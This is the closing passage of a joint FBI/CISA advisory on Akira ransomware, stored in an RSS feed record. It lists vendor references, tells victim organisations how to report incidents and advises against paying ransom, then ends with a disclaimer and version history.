<li><a href=\"https://blogs.cisco.com/security/akira-ransomware-targeting-vpns-without-multi-factor-authentication\" title=\"Akira Ransomware Targeting VPNs without Multi-Factor Authentication\">Cisco: Akira Ransomware Targeting VPNs without MFA</a></li>
<li><a href=\"https://www.truesec.com/hub/blog/akira-ransomware-and-exploitation-of-cisco-anyconnect-vulnerability-cve-2020-3259\" title=\"Akira Ransomware and Exploitation of Cisco Anyconnect Vulnerability CVE-2020-3259\">Truesec: Indications of Akira Ransomware Group Actively Exploiting Cisco AnyConnect CVE-2020-3259</a></li>
<li><a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">TrendMicro: Akira Ransomware Spotlight</a></li>
<li><a href=\"https://www.crowdstrike.com/cybersecurity-101/kerberoasting/\" title=\"KERBEROASTING ATTACKS\">CrowdStrike: What is a Kerberoasting Attack?</a></li>
<li><a href=\"https://news.sophos.com/en-us/2023/12/21/akira-again-the-ransomware-that-keeps-on-taking/\" title=\"Akira, again: The ransomware that keeps on taking\">Sophos: Akira, again: The ransomware that keeps on taking</a></li>
<li><a href=\"https://news.sophos.com/en-us/2023/05/09/akira-ransomware-is-bringin-88-back/\" title=\"Akira Ransomware is “bringin’ 1988 back”\">Sophos: Akira Ransomware is “bringin’ 1988 back”</a></li>
</ol>
<h3><strong>REPORTING</strong></h3>
<p>Your organization has no obligation to respond or provide information back to the FBI in response to this joint CSA. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.</p>
<p>The FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Akira threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>The FBI, CISA, EC3, and NCSC-NL do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s&nbsp;<a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complain Center (IC3)\">Internet Crime Complain Center (IC3)</a>, a local <u>FBI&nbsp;</u><a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">Field Office</a>, or CISA via the agency’s&nbsp;<a href=\"https://www.cisa.gov/forms/report\" title=\"Incident Reporting System\">Incident Reporting System</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or by calling 1-844-Say-CISA (1-844-729-2472).</p>
<h3><strong>DISCLAIMER</strong></h3>
<p>The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, EC3, and NCSC-NL do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI or CISA.</p>
<h3><strong>ACKNOWLEDGEMENTS</strong></h3>
<p>Cisco, Sophos, and Fortinet contributed to this advisory.</p>
<h3><strong>VERSION HISTORY</strong></h3>
<p>April 18, 2024: Initial version.</p>
") (pubDate nil "Wed, 17 Apr 2024 12:23:11 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/21319"))))